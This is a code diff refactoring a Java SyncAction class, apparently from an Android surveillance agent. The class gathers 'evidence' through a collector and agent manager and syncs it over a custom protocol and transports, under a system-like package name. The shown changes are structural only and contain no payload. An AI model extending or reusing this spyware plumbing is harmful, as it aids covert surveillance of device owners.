@@ -12,21 +12,24 @@ package com.android.service.action;
 import java.util.Date;
 import java.util.Vector;
 
+import org.json.JSONObject;
+
+import com.android.service.Trigger;
 import com.android.service.action.sync.Protocol;
 import com.android.service.action.sync.ProtocolException;
 import com.android.service.action.sync.Transport;
 import com.android.service.action.sync.ZProtocol;
-import com.android.service.agent.AgentManager;
-import com.android.service.agent.AgentType;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.evidence.EvidenceCollector;
+import com.android.service.manager.ManagerAgent;
 import com.android.service.util.Check;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class SyncAction.
  */
-public abstract class SyncAction extends SubAction {
+public abstract class SyncAction extends SubActionSlow {
 
 	private static final String TAG = "SyncAction"; //$NON-NLS-1$
 
@@ -34,7 +37,7 @@ public abstract class SyncAction extends SubAction {
 	protected EvidenceCollector logCollector;
 
 	/** The agent manager. */
-	protected AgentManager agentManager;
+	protected ManagerAgent agentManager;
 	// protected Transport[] transports = new Transport[Transport.NUM];
 	/** The transports. */
 	protected Vector<Object> transports;
@@ -50,18 +53,18 @@ public abstract class SyncAction extends SubAction {
 	 * 
 	 * @param type
 	 *            the action id
-	 * @param confParams
+	 * @param jsubaction
 	 *            the conf params
 	 */
-	public SyncAction(final int type, final byte[] confParams) {
-		super(type, confParams);
+	public SyncAction( final ConfAction jsubaction) {
+		super( jsubaction);
 
 		logCollector = EvidenceCollector.self();
-		agentManager = AgentManager.self();
+		agentManager = ManagerAgent.self();
 		transports = new Vector<Object>();
 
 		protocol = new ZProtocol();
-		initialized = parse(confParams);
+		initialized = parse(jsubaction);
 		initialized &= initTransport();
 	}
 
@@ -71,7 +74,7 @@ public abstract class SyncAction extends SubAction {
 	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
 	 */
 	@Override
-	public boolean execute() {
+	public boolean execute(Trigger trigger) {
 		if (Cfg.DEBUG) {
 			Check.requires(protocol != null, "execute: null protocol"); //$NON-NLS-1$
 		}
@@ -102,7 +105,7 @@ public abstract class SyncAction extends SubAction {
 			// Toast.LENGTH_LONG).show();
 		}
 
-		agentManager.reload(AgentType.AGENT_DEVICE);
+		//agentManager.reload(AgentType.AGENT_DEVICE);
 		agentManager.resetIncrementalLogs();
 
 		boolean ret = false;
@@ -184,16 +187,6 @@ public abstract class SyncAction extends SubAction {
 
 		return false;
 	}
-
-	/**
-	 * Parses the.
-	 * 
-	 * @param confParams
-	 *            the conf params
-	 * @return true, if successful
-	 */
-	@Override
-	protected abstract boolean parse(final byte[] confParams);
 
 	/**
 	 * Inits the transport.
